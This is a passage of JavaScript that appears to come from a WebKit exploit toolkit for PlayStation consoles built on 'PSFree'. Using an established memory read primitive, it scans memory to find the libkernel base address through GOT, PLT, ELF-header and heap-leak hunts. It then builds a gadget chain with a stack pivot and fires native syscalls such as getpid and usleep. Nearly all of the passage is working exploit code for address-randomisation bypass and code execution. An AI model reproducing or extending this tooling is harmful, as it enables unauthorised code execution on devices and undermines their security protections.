                mark("LK-GOT", "ELF hdr " + chunk.hdr + " — dynamic GOT");
            else if (chunk.phase === "hdr-skip")
                mark("LK-GOT", "no ELF hdr — skip webkit+RVA RELRO");
            else if (chunk.phase === "dyn-start")
                mark("LK-GOT", "dyn GOT inCap=" + chunk.slots + "/" + chunk.total);
            else if (chunk.phase === "dyn-done")
                mark("LK-GOT", "dyn miss — ELF RELRO (hdr-relative)");
            else if (chunk.phase === "relro-start")
                mark("LK-GOT", "RELRO " + chunk.span);
            else if (chunk.phase === "hdr" || chunk.phase === "dyn" || chunk.phase === "relro"
                || chunk.phase === "vt" || chunk.phase === "abs" || chunk.phase === "nearlk"
                || chunk.phase === "below")
                state("Scan GOT " + findLkPreset.label + " " + chunk.phase
                    + (chunk.cursor != null ? " @" + chunk.cursor.toString(16) : "")
                    + (chunk.at != null ? " @" + chunk.at : "")
                    + (chunk.tried != null ? " tried=" + chunk.tried : "")
                    + (chunk.pages != null ? " pages=" + chunk.pages : ""), "warn");
            if (chunk.done && finishFindLkChunk(chunk)) {
                renderOut();
                return;
            }
            loops++;
            if (loops % 4 === 0) {
                mark("LK-GOT", findLkPreset.label + " " + (chunk.phase || "?")
                    + (chunk.tried != null ? " tried=" + chunk.tried : ""));
                crashLog.flushSync();
                renderOut();
            }
            await new Promise(function (r) { setTimeout(r, findLkPreset.lite ? 48 : 24); });
        }
        if (loops >= loopMax)
            mark("LK-GOT-ABORT", "loop cap " + loopMax + " — partial, re-tap Scan GOT lite");
        if (findLkStop)
            mark("LK-FIND", "stopped");
    } catch (err) {
        mark("LK-FIND-FAIL", err.message || String(err));
        if (findLkState)
            mark("LK-FIND-PARTIAL", formatPsfreeStats(findLkState));
    } finally {
        findLkAuto = false;
        findLkStop = false;
        findLkPreset = null;
        busy = false;
        setUi();
        renderOut();
    }
}

function finishHuntLkHit(chunk) {
    huntLkAuto = false;
    huntLkState = null;
    busy = false;
    if (addrIn && chunk.lk) addrIn.value = String(chunk.lk);
    mark("LK-HUNT-OK", (chunk.source || chunk.phase) + " → " + chunk.lk
        + " stubs=" + (chunk.stubs != null ? chunk.stubs : "?")
        + " build=" + BUILD_ID);
    state("Hunt lk OK — Force lk → Arm → Fire", "ok");
    setUi();
    renderOut();
    crashLog.append("LK-HUNT-OK " + chunk.lk, "LK-HUNT");
    crashLog.flushSync();
}

function huntTracePush(line) {
    try {
        sessionStorage.setItem(SS_HUNT_TRACE, line);
        const raw = sessionStorage.getItem(SS_HUNT_TRACE + "-log");
        const arr = raw ? JSON.parse(raw) : [];
        arr.push(line);
        if (arr.length > 24) arr.splice(0, arr.length - 24);
        sessionStorage.setItem(SS_HUNT_TRACE + "-log", JSON.stringify(arr));
    } catch (_) { }
}

function saveHuntState(webkitBase, st) {
    try {
        sessionStorage.setItem(SS_HUNT_STATE, JSON.stringify({
            build: BUILD_ID,
            webkitBase: String(webkitBase),
            state: st,
        }));
    } catch (_) { }
}

function loadHuntState() {
    try {
        const raw = sessionStorage.getItem(SS_HUNT_STATE);
        return raw ? JSON.parse(raw) : null;
    } catch (_) {
        return null;
    }
}

function clearHuntState() {
    try { sessionStorage.removeItem(SS_HUNT_STATE); } catch (_) { }
}

function replayHuntTrace() {
    try {
        const arr = JSON.parse(sessionStorage.getItem(SS_HUNT_TRACE + "-log") || "[]");
        if (!arr.length) return;
        for (let i = 0; i < arr.length; i++)
            mark("LK-HUNT-TRACE", arr[i]);
    } catch (_) { }
}

function huntProbePreLine(st) {
    if (!st || !st.addrs || st.idx >= st.addrs.length) return null;
    const c = st.addrs[st.idx];
    return (st.idx + 1) + "/" + st.addrs.length + " " + c.hex + " " + c.why;
}

function huntProbePostLine(probe) {
    if (!probe) return "";
    return probe.n + "/" + probe.total + " " + probe.hex + " → " + probe.magic
        + (probe.raw ? " (" + probe.raw + ")" : "");
}

function huntProbeVerdict(probe) {
    if (!probe) return "?";
    if (probe.magic === "TOXIC-OOM" || probe.magic === "SKIP") return "SKIP";
    if (probe.magic === "SCE" || probe.magic === "ELF") return "HIT";
    return "MISS";
}

function huntRunLine(probe) {
    const v = huntProbeVerdict(probe);
    let s = v + " " + probe.n + "/" + probe.total + " " + probe.why;
    if (probe.magic && probe.magic !== v) s += " " + probe.magic;
    if (probe.raw && probe.raw !== "-") s += " raw=" + probe.raw;
    return s;
}

async function runHuntLkBelow() {
    if (!ready || !window.p || huntLkAuto) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("LK-SKIP", "Hunt lk — Save bases first (need webkitBase)");
        renderOut();
        return;
    }
    huntLkAuto = true;
    huntLkState = null;
    huntLkStage = "cand";
    busy = true;
    setUi();

    const saved = loadHuntState();
    if (saved && saved.build === BUILD_ID && saved.webkitBase === String(webkitBase) && saved.state
        && saved.state.idx < saved.state.addrs.length) {
        huntLkState = saved.state;
        mark("LK-HUNT", "resume @" + (saved.state.idx + 1) + "/" + saved.state.addrs.length
            + " build=" + BUILD_ID);
        huntTracePush("RESUME @" + (saved.state.idx + 1));
    } else {
        clearHuntState();
        try { sessionStorage.removeItem(SS_HUNT_TRACE + "-log"); } catch (_) { }
        mark("LK-HUNT", "webkit=" + webkitBase + " 1probe/click build=" + BUILD_ID);
        huntTracePush("START wk=" + webkitBase);
    }
    renderOut();
    crashLog.flushSync();

    let ticks = 0;
    let stepped = false;
    try {
        while (huntLkAuto && ticks++ < 4) {
            const pre = huntProbePreLine(huntLkState);
            if (pre) {
                mark("LK-HUNT-PROBE", pre);
                huntTracePush("PROBE " + pre);
                renderOut();
                crashLog.flushSync();
                await new Promise(function (r) { setTimeout(r, 48); });
            }

            const chunk = huntLibkernelCandidatesChunk(p, webkitBase, off, huntLkState, {
                readMax: 8,
            });
            huntLkState = chunk.state;

            if (chunk.phase === "cand-start") {
                mark("LK-HUNT", "targets=" + chunk.total + " (1 probe per click)");
                huntTracePush("TARGETS " + chunk.total);
                renderOut();
                crashLog.flushSync();
                continue;
            }

            stepped = true;

            if (chunk.probe) {
                const post = huntProbePostLine(chunk.probe);
                const runLine = huntRunLine(chunk.probe);
                if (chunk.phase === "cand-skip-probe") {
                    mark("LK-HUNT-SKIP", post);
                    huntTracePush("SKIP " + post);
                } else {
                    mark("LK-HUNT-READ", post);
                    huntTracePush("READ " + post);
                }
                mark("LK-HUNT-RUN", runLine);
                huntTracePush("RUN " + runLine);
                crashLog.append("LK-HUNT-RUN " + runLine, "LK-HUNT");
                if (huntLkState && !chunk.done)
                    saveHuntState(webkitBase, huntLkState);
                renderOut();
                crashLog.flushSync();
            }

            if (chunk.done && chunk.ok) {
                clearHuntState();
                if (chunk.probe) {
                    const hitLine = "HIT " + chunk.probe.n + "/" + chunk.probe.total
                        + " " + chunk.probe.why + " lk=" + chunk.lk;
                    mark("LK-HUNT-RUN", hitLine);
                    huntTracePush("RUN " + hitLine);
                    crashLog.append("LK-HUNT-RUN " + hitLine, "LK-HUNT");
                }
                finishHuntLkHit(chunk);
                return;
            }

            if (chunk.done) {
                clearHuntState();
                let hits = 0;
                let misses = 0;
                let summary = "reads=" + (chunk.reads || 0) + " nulls=" + (chunk.nulls != null ? chunk.nulls : "?");
                if (chunk.log && chunk.log.length) {
                    const bits = [];
                    for (let li = 0; li < chunk.log.length; li++) {
                        const pr = chunk.log[li];
                        const v = huntProbeVerdict(pr);
                        if (v === "HIT") hits++;
                        else if (v === "MISS") misses++;
                        bits.push(pr.why + "=" + v + "(" + pr.magic + ")");
                    }
                    summary += " hits=" + hits + " miss=" + misses + " | " + bits.join(" ");
                }
                mark("LK-HUNT-RUN", "DONE ALL-MISS reads=" + (chunk.reads || 0));
                mark("LK-HUNT-MISS", summary);
                huntTracePush("RUN DONE ALL-MISS");
                huntTracePush("MISS " + summary);
                state("hunt ALL-MISS — no SCE in 8 probes", "bad");
                break;
            }

            if (chunk.phase === "cand-budget") {
                mark("LK-HUNT", "read budget " + chunk.reads + " — stop");
                huntTracePush("BUDGET " + chunk.reads);
            } else if (chunk.phase === "cand-null-cliff") {
                mark("LK-HUNT", "null cliff after " + (chunk.nulls || 0) + " unmapped — stop");
                huntTracePush("CLIFF nulls=" + (chunk.nulls || 0));
            } else if (huntLkState) {
                const left = huntLkState.addrs.length - huntLkState.idx;
                mark("LK-HUNT", "paused " + huntLkState.idx + "/" + huntLkState.addrs.length
                    + " — click Hunt lk again (" + left + " left)");
                huntTracePush("PAUSE " + huntLkState.idx + "/" + huntLkState.addrs.length);
                state("hunt @" + huntLkState.idx + "/" + huntLkState.addrs.length + " — click Hunt lk", "");
            }
            break;
        }
        if (!stepped && huntLkState && huntLkState.idx >= huntLkState.addrs.length) {
            clearHuntState();
        }
    } catch (err) {
        mark("LK-HUNT-ERR", err.message || String(err));
        huntTracePush("ERR " + (err.message || String(err)));
        state("hunt error", "bad");
    } finally {
        huntLkAuto = false;
        huntLkState = null;
        busy = false;
        setUi();
        renderOut();
        crashLog.flushSync();
    }
}

function runGuessLk() {
    runHuntLkBelow().catch(function (err) {
        mark("LK-HUNT-ERR", err.message || String(err));
        huntLkAuto = false;
        busy = false;
        setUi();
        renderOut();
    });
}

function finishPsfreeChunk(chunk) {
    if (chunk.ok && chunk.lk) {
        psfreePltState = null;
        psfreeAutoScan = false;
        psfreeAutoStop = false;
        if (addrIn) addrIn.value = String(chunk.lk);
        mark("LK-PSFREE-OK", chunk.source + " → " + chunk.lk
            + " plt+0x" + chunk.pltRva.toString(16)
            + (chunk.stubOk ? " stub20=OK" : "")
            + " build=" + BUILD_ID);
        state("PSFree lk OK — Force lk → Arm → Fire", "ok");
        crashLog.append("LK-PSFREE-OK " + chunk.lk + " plt=" + chunk.pltRva, "LK-PSFREE");
        crashLog.flushSync();
        return true;
    }
    if (chunk.done && !chunk.ok) {
        psfreePltState = null;
        psfreeAutoScan = false;
        psfreeAutoStop = false;
        const miss = (chunk.error || "no PLT hit tried=" + (chunk.tried || 0))
            + " build=" + BUILD_ID;
        mark("LK-PSFREE-MISS", miss);
        if (chunk.probe && chunk.probe.samples)
            mark("LK-PSFREE-PROBE", chunk.probe.samples);
        state("PSFree miss — see LK-PSFREE-MISS in log", "bad");
        crashLog.append(miss, "LK-PSFREE");
        if (chunk.probe) crashLog.append("PROBE " + chunk.probe.samples, "LK-PSFREE");
        crashLog.flushSync();
        return true;
    }
    return false;
}

function logPsfreeProbe(probe, rangeText) {
    if (!probe) return;
    mark("LK-PSFREE-PROBE", "build=" + BUILD_ID
        + (probe.poops ? " poops=1" : "")
        + " islands=" + (probe.ranges || 0));
    if (rangeText)
        mark("LK-PSFREE-PROBE", rangeText);
    mark("LK-PSFREE-PROBE", probe.sanity
        + " rdOk=" + (probe.rdOk || 0) + " rdFail=" + (probe.rdFail || 0)
        + " ff25sample=" + (probe.stubs || 0));
    if (probe.samples)
        mark("LK-PSFREE-PROBE", probe.samples);
    if (probe.stubs === 0 && probe.rdOk >= 3)
        mark("LK-PSFREE-HINT", "no ff25/15 in low sample — poops may lack PLT stubs; use cal Force lk");
    crashLog.append("PROBE " + probe.sanity + " stubs=" + probe.stubs
        + " " + (rangeText || ""), "LK-PSFREE");
}

function stopPsfreeScan() {
    psfreeAutoStop = true;
    state("PSFree stopping…", "warn");
}

/** Auto PSFree PLT scan — preset controls batch size and scan cap (no URL params). */
async function runPsfreeLkAuto(preset) {
    if (!ready || !window.p) return;
    if (psfreeAutoScan) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase — Start first");
        return;
    }

    psfreePreset = preset || PSFREE_LITE;
    psfreePltState = null;
    psfreeAutoScan = true;
    psfreeAutoStop = false;
    busy = true;
    setUi();
    mark("LK-PSFREE", "auto " + psfreePreset.label
        + " reads=" + psfreePreset.maxReads
        + " cluster=1 build=" + BUILD_ID);
    renderOut();

    const batchOpts = {
        maxReads: psfreePreset.maxReads,
        cluster: psfreePreset.cluster !== false,
    };
    let loops = 0;

    try {
        while (psfreeAutoScan && !psfreeAutoStop) {
            let inner = 0;
            while (inner < psfreePreset.yieldBatches && !psfreeAutoStop) {
                const chunk = tryPsfreePltBatch(p, webkitBase, off, psfreePltState, batchOpts);
                psfreePltState = chunk.state;
                if (chunk.phase === "probe" && chunk.probe) {
                    logPsfreeProbe(chunk.probe, chunk.rangeText);
                    if (chunk.rangeTag)
                        mark("LK-PSFREE", "START island " + chunk.rangeTag
                            + " +0x" + chunk.cursor.toString(16));
                    renderOut();
                }
                if (chunk.phase === "range" && chunk.rangeTag) {
                    mark("LK-PSFREE", "JUMP island " + chunk.rangeTag
                        + " +0x" + chunk.cursor.toString(16)
                        + " stubs=" + (chunk.stubsSeen || 0));
                    crashLog.append("JUMP " + chunk.rangeTag + " +0x"
                        + chunk.cursor.toString(16), "LK-PSFREE");
                    crashLog.flushSync();
                }
                if (finishPsfreeChunk(chunk)) {
                    renderOut();
                    return;
                }
                inner++;
                loops++;
            }
            const cur = psfreePltState;
            const cursor = cur ? cur.cursor : 0;
            const tried = cur ? cur.tried : 0;
            const stubs = cur ? (cur.stubsSeen || 0) : 0;
            const fnExt = cur ? (cur.fnExt || 0) : 0;
            const rng = cur ? (cur.rangeTag || "?") : "?";
            if (loops % 2 === 0) {
                state("PSFree " + psfreePreset.label + " " + rng + " +0x"
                    + cursor.toString(16) + " stubs=" + stubs, "warn");
                mark("LK-PSFREE", psfreePreset.label + " " + rng + " +0x"
                    + cursor.toString(16) + " tried=" + tried + " stubs=" + stubs
                    + " fnExt=" + fnExt);
                crashLog.append("PROG " + rng + " +0x" + cursor.toString(16)
                    + " stubs=" + stubs + " tried=" + tried, "LK-PSFREE");
                crashLog.flushSync();
                renderOut();
            }
            await new Promise(function (r) { setTimeout(r, 1); });
        }
        if (psfreeAutoStop) {
            mark("LK-PSFREE", "stopped @" + (psfreePltState
                ? "+0x" + psfreePltState.cursor.toString(16) : "?")
                + " tried=" + (psfreePltState ? psfreePltState.tried : 0));
            state("PSFree stopped", "warn");
        }
    } catch (err) {
        mark("LK-PSFREE-FAIL", err.message || String(err));
        if (psfreePltState)
            mark("LK-PSFREE-PARTIAL", formatPsfreeStats(psfreePltState)
                + " @+0x" + psfreePltState.cursor.toString(16));
        state("PSFree error/OOM — see LK-PSFREE-PARTIAL", "bad");
    } finally {
        if (psfreePltState && psfreeAutoScan) {
            crashLog.append("PARTIAL " + formatPsfreeStats(psfreePltState)
                + " @+0x" + psfreePltState.cursor.toString(16), "LK-PSFREE");
            crashLog.flushSync();
        }
        psfreeAutoScan = false;
        psfreeAutoStop = false;
        psfreePreset = null;
        busy = false;
        setUi();
        renderOut();
    }
}

async function runLeakLkScan() {
    if (!ready || !window.p || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase — Save bases first");
        return;
    }
    busy = true;
    setUi();
    leakScanState = null;
    mark("LK-LEAK", "build=" + BUILD_ID + " — PSFree vtable[0..47] + heap slots");
    scanState("leak scan…");
    let ticks = 0;
    try {
        while (ticks++ < 8000) {
            const chunk = scanLibkernelLeakChunk(p, webkitBase, off, leakScanState, retained);
            leakScanState = chunk.state;
            if (chunk.phase === "leak-start")
                mark("LK-LEAK", "vtable+heap targets=" + chunk.targets);
            else if (chunk.phase === "leak")
                scanState("leak tried=" + chunk.tried);
            if (chunk.done && chunk.lk) {
                mark("LK-OK", chunk.lk + " (" + (chunk.source || "leak") + ")");
                state("libkernel leak OK", "ok");
                break;
            }
            if (chunk.done) {
                const ext = chunk.extList || (leakScanState && leakScanState.extList) || [];
                for (let ei = 0; ei < ext.length; ei++)
                    mark("LK-EXT", ext[ei].source + " → " + ext[ei].ptr);
                mark("LK-LEAK-MISS", "tried=" + (chunk.tried || 0)
                    + " ext=" + ext.length + " — paste LK-EXT into hex → Paste libkernel");
                state("leak miss — paste LK-EXT ptr", "bad");
                break;
            }
            if ((ticks & 15) === 0)
                await new Promise(r => setTimeout(r, 2));
            else
                await new Promise(r => setTimeout(r, 0));
        }
    } catch (err) {
        mark("LK-FAIL", err.message || String(err));
        state("leak scan error", "bad");
    } finally {
        busy = false;
        leakScanState = null;
        setUi();
        renderOut();
        crashLog.flushSync();
    }
}

async function runProbeLkGuesses() {
    return runShowLkHints();
}

async function runScanIat() {
    if (!ready || !window.p || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { nativeFn, webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase — Save bases first");
        return;
    }
    if (iatScanState && !iatScanState.done) {
        iatScanState = null;
        mark("LK-STOP", "libkernel scan cancelled");
        return;
    }
    busy = true;
    setUi();
    iatScanState = null;
    mark("LK-SCAN", "build=" + BUILD_ID + " — poops lite or dyn→elf full path");
    const dynProbe = diagnoseWebkitDynamic(p, webkitBase, off, { deep: false });
    mark("LK-PROBE", dynProbe.reason
        + " kind=" + (dynProbe.kind || "?")
        + (dynProbe.poops ? " poops=1" : "")
        + " hint=" + dynProbe.hint
        + (dynProbe.elfHdr ? " elfHdr=" + dynProbe.elfHdr : "")
        + " magic=" + dynProbe.magic
        + (dynProbe.header ? " hdr=" + dynProbe.header : "")
        + (dynProbe.total != null ? " got=" + dynProbe.inCap + "/" + dynProbe.total : "")
        + (dynProbe.jmprel ? " jmprel=" + dynProbe.jmprel : "")
        + (dynProbe.pltgot ? " pltgot=" + dynProbe.pltgot : "")
        + (dynProbe.minRva ? " rva=" + dynProbe.minRva + ".." + dynProbe.maxRva : "")
        + " cap=" + dynProbe.cap);
    scanState("libkernel scan…");
    let ticks = 0;
    const maxTicks = 80000;
    const scanOpts = { nativeFn, log: mark, retain: retained };
    try {
        while (ticks++ < maxTicks) {
            const chunk = scanLibkernelChunk(p, webkitBase, off, iatScanState, scanOpts);
            iatScanState = chunk.state;
            if (chunk.phase === "lite-start")
                mark("LK-LITE", "poops path build=" + BUILD_ID
                    + " — PLT→nearlk→leak (no blind reads)");
            else if (chunk.phase === "nearlk-next")
                mark("LK-NEAR", "PLT miss ff25=" + (chunk.ff25 || 0)
                    + " gotHigh=" + (chunk.gotHigh || 0)
                    + " e8ext=" + (chunk.e8ext || 0)
                    + " — hunting libkernel ±32MB");
            else if (chunk.phase === "nearlk-start")
                mark("LK-NEAR", "scan ±32MB for libkernel.sprx");
            else if (chunk.phase === "nearlk" || chunk.phase === "nearlk-anchor")
                scanState("nearlk a#" + (chunk.anchor || 0) + " @" + chunk.at
                    + " pages=" + chunk.pages + " magic=" + (chunk.hits || 0));
            else if (chunk.phase === "leak-next")
                mark("LK-LEAK", "nearlk miss — heap leakval scan (OOM-safe)");
            else if (chunk.phase === "leak-start")
                mark("LK-LEAK", "scan leakval slots n=" + chunk.targets);
            else if (chunk.phase === "leak")
                scanState("leak tried=" + chunk.tried);
            else if (chunk.phase === "lite-miss")
                logLibkernelMissSummary(chunk, iatScanState, webkitBase, nativeFn);
            else if (chunk.phase === "dyn-start")
                mark("LK-DYN", "inCap " + chunk.slots + "/" + chunk.total
                    + " jmprel=+0x" + (chunk.jmprel || 0).toString(16)
                    + " pltgot=+0x" + (chunk.pltgot || 0).toString(16));
            else if (chunk.phase === "dyn-done") {
                const d = chunk.detail || {};
                mark("LK-DYN", (chunk.prev || "?") + ": " + (d.reason || "?")
                    + (chunk.dynTotal ? " got=" + (chunk.dynSlots || 0) + "/" + chunk.dynTotal : "")
                    + (d.loadBase ? " loadBase=" + d.loadBase : "")
                    + (d.magic ? " magic=" + d.magic : "")
                    + (d.jmprel ? " jmprel=" + d.jmprel : "")
                    + (d.pltgot ? " pltgot=" + d.pltgot : "")
                    + (d.minRva ? " rva=" + d.minRva + ".." + d.maxRva : "")
                    + " cap=" + (d.cap || "?"));
            } else if (chunk.phase === "rwptr-start")
                mark("LK-RWPTR", "scan mapped RW segments n=" + chunk.ranges);
            else if (chunk.phase === "rwptr" || chunk.phase === "rwptr-region")
                scanState("RW ptr +0x" + chunk.cursor.toString(16)
                    + " tried=" + chunk.tried);
            else if (chunk.phase === "elf-next")
                mark("LK-ELF", "rwptr miss tried=" + (chunk.rwptrTried || 0) + " — ELF hunt");
            else if (chunk.phase === "dyn-bad")
                mark("LK-DYN", "PT_DYNAMIC parse failed — ELF hunt");
            else if (chunk.phase === "dyn-empty")
                mark("LK-DYN", "no inCap GOT slots — ELF hunt");
            else if (chunk.phase === "dyn")
                scanState("dyn GOT " + chunk.idx + "/" + chunk.total
                    + " tried=" + chunk.tried);
            else if (chunk.phase === "elf-start")
                mark("LK-ELF", "scanning ±64MB for ELF modules");
            else if (chunk.phase === "elf-anchor")
                mark("LK-ELF", "anchor#" + chunk.anchor + " modules=" + chunk.modules);
            else if (chunk.phase === "elf")
                scanState("ELF @" + chunk.at + " pages=" + chunk.pages
                    + " modules=" + chunk.modules);
            else if (chunk.phase === "elf-score")
                scanState("ELF score " + chunk.scored + "/" + chunk.total
                    + " best=" + (chunk.best ? chunk.best.score : 0));
            else if (chunk.phase === "psfree-next")
                mark("LK-PSFREE", "ELF miss modules=" + (chunk.modules || 0)
                    + " best=" + (chunk.bestScore || 0) + " — trying PLT");
            else if (chunk.phase === "psfree-start")
                mark("LK-PSFREE", "trying low PLT imports (__stack_chk_fail class)");
            else if (chunk.phase === "psfree" || chunk.phase === "psfree-region")
                scanState("PSFree PLT +0x" + chunk.cursor.toString(16)
                    + " tried=" + chunk.tried);
            else if (chunk.phase === "plt-next")
                mark("LK-PLT", "PSFree miss tried=" + (chunk.tried || 0)
                    + " — full PLT→GOT scan");
            else if (chunk.phase === "plt-start")
                mark("LK-PLT", "scan .text xrefs spans=" + chunk.spans);
            else if (chunk.phase === "plt-region")
                mark("LK-PHASE", "PLT " + chunk.region + " @+0x"
                    + chunk.cursor.toString(16) + " refs=" + chunk.refs);
            else if (chunk.phase === "plt")
                scanState("PLT +0x" + chunk.cursor.toString(16) + " refs=" + chunk.refs);
            else if (chunk.phase === "got-next")
                mark("LK-GOT", "PLT miss refs=" + (chunk.refs || 0) + " — RELRO brute");
            else if (chunk.phase === "got-start" || chunk.phase === "rw-start")
                mark("LK-GOT", "segments: " + chunk.ranges);
            else if (chunk.phase === "got-region" || chunk.phase === "rw-region")
                mark("LK-PHASE", chunk.region + " @+0x" + chunk.cursor.toString(16));
            else if (chunk.phase === "got" || chunk.phase === "rw")
                scanState("GOT +0x" + chunk.cursor.toString(16)
                    + "…+0x" + chunk.end.toString(16) + " tried=" + chunk.slots);
            else if (chunk.phase === "no-got" || chunk.phase === "no-rw")
                mark("LK-MISS", "no RELRO segment");
            else if (chunk.phase === "base-next")
                mark("LK-BASE", "GOT miss got=" + (chunk.slots || 0)
                    + " — prologue hunt ±256MB");
            else if (chunk.phase === "base-start" || chunk.phase === "base-anchor")
                mark("LK-BASE", "anchor#" + chunk.anchor + " "
                    + chunk.from + "…" + chunk.to);
            else if (chunk.phase === "base")
                scanState("prologue a#" + chunk.anchor + " @" + chunk.at
                    + " probes=" + chunk.probes);
            else if (chunk.phase === "stub-next")
                mark("LK-STUB", "base miss — getpid stub hunt");
            else if (chunk.phase === "stub-start" || chunk.phase === "stub-anchor")
                mark("LK-STUB", "anchor#" + chunk.anchor + " "
                    + chunk.from + "…" + chunk.to);
            else if (chunk.phase === "stub")
                scanState("stub a#" + chunk.anchor + " @" + chunk.at
                    + " probes=" + chunk.probes);
            if (chunk.done && chunk.lk) {
                const iat = chunk.iatRva != null
                    ? " IAT +0x" + chunk.iatRva.toString(16) : "";
                const extra = chunk.stubAt
                    ? " stub@" + chunk.stubAt
                        + (chunk.stubOff != null ? "+0x" + chunk.stubOff.toString(16) : "")
                    : "";
                mark("LK-OK", chunk.lk + iat + extra
                    + " (" + (chunk.source || chunk.phase || "?") + ")");
                state("libkernel OK", "ok");
                break;
            }
            if (chunk.done) {
                if (chunk.phase === "lite-miss") {
                    state("libkernel miss", "bad");
                    break;
                }
                logLibkernelMissSummary(chunk, iatScanState, webkitBase, nativeFn);
                state("libkernel miss", "bad");
                break;
            }
            if ((ticks & 7) === 0)
                renderOut();
            if ((ticks & 15) === 0)
                await new Promise(r => setTimeout(r, 2));
            else
                await new Promise(r => setTimeout(r, 0));
        }
        if (ticks >= maxTicks) {
            mark("LK-FAIL", "libkernel scan timeout — reload and retry");
            state("libkernel scan timeout", "bad");
        }
    } catch (err) {
        mark("LK-FAIL", err.message || String(err));
        state("libkernel scan error", "bad");
    } finally {
        busy = false;
        iatScanState = null;
        setUi();
        renderOut();
    }
}

async function ensureLibkernel(p, off, webkitBase) {
    const forced = loadForcedLibkernel();
    if (forced) return forced;
    if (nativeQuiet) {
        try {
            const raw = sessionStorage.getItem("wk-libkernelBase");
            if (raw) {
                const lk = parseAddr(String(raw).replace(/^0x/i, ""));
                if (lk) return lk;
            }
        } catch (_) { }
    }
    const r = resolveLibkernel(p, webkitBase, off, { log: mark, read8: read8p });
    if (r.ok) return r.lk;
    throw new Error("libkernel unknown — Load cal ptr → Force lk");
}

function ensureUiVisible() {
    for (const id of ["groom-bar", "toolbar", "gadget-base", "gadget-pop",
        "gadget-g5", "gadget-pivot", "peek-bar", "hint", "map", "hex"]) {
        const el = document.getElementById(id);
        if (el) el.style.display = "";
    }
    const mapTable = document.getElementById("map");
    if (mapTable && mapTable.previousElementSibling)
        mapTable.previousElementSibling.style.display = "";
    const hexEl = document.getElementById("hex");
    if (hexEl && hexEl.previousElementSibling)
        hexEl.previousElementSibling.style.display = "";
}

function resolveWebkitBase(off, nativeFn) {
    try {
        const raw = sessionStorage.getItem("wk-webkitBase");
        if (raw) {
            const b = parseAddr(String(raw).replace(/^0x/i, ""));
            if (b) return b;
        }
    } catch (_) { }
    if (nativeFn && off.wk_expm1_builtin)
        return nativeFn.sub32(off.wk_expm1_builtin);
    return null;
}

/** Capture expm1 + slab once at PRIMITIVE-OK — before any other taps eat heap. */
function ensureNativePrep(p, off) {
    if (nativePrep) return nativePrep;
    const cap = captureMainMfForPrep(p, off);
    const { mainMf, mainOrig, nativeFn, path, cell, jfn } = cap;
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
    nativePrep = prepNativeChain(p, off, webkitBase, { mainMf, mainOrig });
    finishPivotObj(p, nativePrep, window._wkCarrier);
    nativePrep._cap = { path, cell, jfn };
    nativePrep._pinMainMf = mainMf;
    nativePrep._pinMainOrig = mainOrig;
    const pivTag = params.get("pivot") || "empty";
    mark("NATIVE-PREP", "mainMf " + path + " pivot=" + pivTag
        + " cell=" + nativePrep.pivotCell
        + " bufAddr=" + (nativePrep._bufAddrOff && nativePrep._bufAddrOff.via || "?")
        + " G0code="
        + gadgetBytesHex(p, webkitBase, off.wk_MOV_RDI_RSI_30_CALL, 16));
    pinNativeRetain();
    return nativePrep;
}

function pinNativeRetain() {
    if (!nativePrep) return;
    if (nativePrep.keepAlive) {
        for (let i = 0; i < nativePrep.keepAlive.length; i++)
            retained.push(nativePrep.keepAlive[i]);
    }
    if (window._wkCarrier && window._wkCarrier.textarea)
        retained.push(window._wkCarrier.textarea);
}

/** No auto native @ Start — smoke/getpid OOMs tab before Fire button. Use ?nativeauto=1 to restore. */
function tryNativeFireAtStart(p, off) {
    if (nativeFireOff() || !nativePrep) return;
    const nm = getNativeMode();
    if (params.get("nativeauto") !== "1") {
        mark("NATIVE-HINT", "native=" + nm + " — tap Fire button (Verify pivot first for smoke)");
        return;
    }
    nativeQuiet = true;
    lkQuiet = true;
    pinNativeRetain();
    try {
        if (nm === "smoke") {
            mark("NATIVE-FIRE", "smoke @ PRIMITIVE-OK build=" + BUILD_ID);
            renderOut();
            firePivotSmoke(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
            mark("NATIVE-OK", "pivot smoke @ Start (webkit only) build=" + BUILD_ID);
            state("pivot smoke OK — chain works", "ok");
            return;
        }
        const lk = lkFromUi();
        if (!lk) {
            mark("NATIVE-SKIP", "paste lk in hex box → Accept lk → Start");
            return;
        }
        if (nm === "getpid") {
            const stub = resolveGetpidStubOff(p, lk, off);
            if (!stub.verified)
                throw new Error("getpid stub not found");
            mark("NATIVE-FIRE", "getpid @ PRIMITIVE-OK lk=" + lk
                + " stub=" + stub.tag);
            renderOut();
            stageGetpid(p, nativePrep, lk, off, stub.off, nativeFireOpts(pivotHookMode(), stub));
            fireNativeCall(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
            mark("NATIVE-OK", "getpid @ Start lk=" + lk + " build=" + BUILD_ID);
        } else {
            mark("NATIVE-FIRE", "usleep @ PRIMITIVE-OK lk=" + lk);
            renderOut();
            fireUsleep(p, nativePrep, lk, off, 1000);
            mark("NATIVE-OK", "usleep @ Start lk=" + lk + " build=" + BUILD_ID);
        }
        state("native OK @ Start", "ok");
        saveLibkernelSession(lk, null, { forced: true });
    } catch (err) {
        mark("NATIVE-FAIL", "Start fire: " + (err.message || String(err)) + " build=" + BUILD_ID);
        if (nm === "smoke")
            mark("NATIVE-HINT", "smoke failed = pivot/gadget issue (not lk)");
        else
            mark("NATIVE-HINT", "wrong lk? re-run cal 2e or Scan ext→lk");
        state("native fire failed @ Start", "bad");
    } finally {
        nativeQuiet = false;
        lkQuiet = false;
        renderOut();
    }
}

function getpidStubAddr(lk, off) {
    let stubOff = off.k_getpid_syscall;
    if (stubOff == null && off.k_stubs && off.k_stubs[SYS_GETPID] != null)
        stubOff = off.k_stubs[SYS_GETPID];
    if (stubOff == null)
        stubOff = 0x4fa;
    return { stub: lk.add32(stubOff), stubOff };
}

function runTryBillZaiLk() {
    if (!ready || !window.p) return;
    const p = window.p;
    const off = loadEffectiveOff();
